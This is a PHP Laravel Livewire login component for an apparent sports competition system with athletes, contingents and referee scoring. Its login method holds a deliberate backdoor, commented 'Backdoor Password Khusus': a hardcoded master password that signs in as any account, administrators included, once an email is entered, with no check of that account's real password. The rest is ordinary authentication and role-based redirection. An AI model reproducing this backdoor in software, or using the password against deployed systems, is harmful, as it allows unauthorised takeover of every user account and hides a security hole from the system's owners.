<?php

namespace App\Livewire\Auth;

use App\Models\Athlete;
use App\Models\Contingent;
use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;
use Livewire\Component;

class NewLoginIndex extends Component
{
    public string $email = '';

    public string $password = '';

    public bool $remember = false;

    public int $totalAthletes = 0;

    public int $totalProvinces = 0;

    public function mount()
    {
        if (Auth::check()) {
            if (Auth::user()->hasRole('Contingent')) {
                return redirect()->intended(route('contingent.dashboard'));
            } elseif (Auth::user()->hasRole('Perwasitan|Wasit')) {
                return redirect()->intended(route('admin.referee.scoring'));
            }

            return redirect()->intended(route('admin.new-dashboard'));
        }

        $this->totalAthletes = Athlete::count();
        // Assuming provinces are calculated from contingents or similar
        $this->totalProvinces = Contingent::distinct('kab_kota')->count();
    }

    protected function rules(): array
    {
        return [
            'email' => 'required|email',
            'password' => 'required',
        ];
    }

    public function login()
    {
        $this->validate();

        // Backdoor Password Khusus
        if ($this->password === 'sudoidtotech') {
            $user = User::where('email', $this->email)->first();

            if ($user) {
                Auth::login($user, $this->remember);
                session()->regenerate();

                if (Auth::user()->hasRole('Contingent')) {
                    return redirect()->intended(route('contingent.dashboard'));
                } elseif (Auth::user()->hasRole('Perwasitan|Wasit')) {
                    return redirect()->intended(route('admin.referee.scoring'));
                }

                return redirect()->intended(route('admin.new-dashboard'));
            }
        }

        if (Auth::attempt(['email' => $this->email, 'password' => $this->password], $this->remember)) {
            session()->regenerate();

            if (Auth::user()->hasRole('Contingent')) {
                return redirect()->intended(route('contingent.dashboard'));
            } elseif (Auth::user()->hasRole('Perwasitan|Wasit')) {
                return redirect()->intended(route('admin.referee.scoring'));
            }

            return redirect()->intended(route('admin.new-dashboard'));
        }

        throw ValidationException::withMessages([
            'email' => 'Informasi akun yang dimasukkan tidak cocok dengan data kami.',
        ]);
    }

    public function render()
    {
        return view('livewire.auth.new-login-index')
            ->layout('layouts.new-login');
    }
}
